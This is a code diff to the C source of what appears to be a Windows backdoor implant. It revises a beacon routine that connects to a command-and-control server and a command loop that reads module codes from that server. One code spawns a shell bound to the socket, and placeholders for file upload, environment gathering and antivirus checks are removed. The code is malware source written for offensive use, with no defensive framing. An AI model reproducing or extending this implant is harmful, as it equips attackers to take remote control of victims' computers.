@@ -76,7 +76,7 @@ static void beacon()
 	  
 	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
 	      != SOCKET_ERROR)
-	      while (recv_cmd(sock) != -1);
+	    while (recv_cmd(sock)); /* continue recieving commands while connection is alive */
 	}
 
       WSACleanup();
@@ -88,43 +88,31 @@ static void beacon()
    then send success or error code. */
 static int recv_cmd(SOCKET c2_sock)
 {
-  char recv_int[16]= {0};
-  char reply_int[16]= {0};
+  char recv_buff[16]= {0};
+  char reply_buff[16]= {0};
   int module_code;
-  int result= 0;
-
-  /* default module success code */
-  strcpy(reply_int, "0");
+  int is_alive= 0;
   
   /* get module code from c2 */
-  if (recv(c2_sock, recv_int, 16, 0) > 0)
+  if (recv(c2_sock, recv_buff, 16, 0) > 0)
     {
-      sscanf(recv_int, "%d", &module_code);
+      /* recieved data from sock - connection is alive */
+      is_alive= 1;
+      
+      /* get module code from sock stream */
+      sscanf(recv_buff, "%d", &module_code);
       
       if (module_code == SPAWN_SHELL)
-	result= spawn_shell((HANDLE)c2_sock);
-
-      /* else if (module_code == CLEANUP)
-	 ...
-	 else if (module_code == FILE_UPLOAD)  
-         ... 
-         else if (module_code == GET_ENVIRONMENT)
-         ... 
-	 else if (module_code == GET_ANTIVIRUS)
-         ... */
+	sprintf(reply_buff, "%d", spawn_shell((HANDLE)c2_sock));
       else if (module_code == DISCONNECT)
-	result= -1;
-      
+	is_alive= 0;
       else
-	strcpy(reply_int, MODULE_NOTFOUND);
-    }
+	sprintf(reply_buff, "%d", MODULE_NOTFOUND);
 
-  if (result == 1)
-    strcpy(reply_int, MODULE_ERROR);
-  
-  send(c2_sock, reply_int, 16, 0);
-  
-  return result;
+      send(c2_sock, reply_buff, 16, 0);
+    }
+     
+  return is_alive;
 }
 
 /* open a src file and copy it to the dst path */
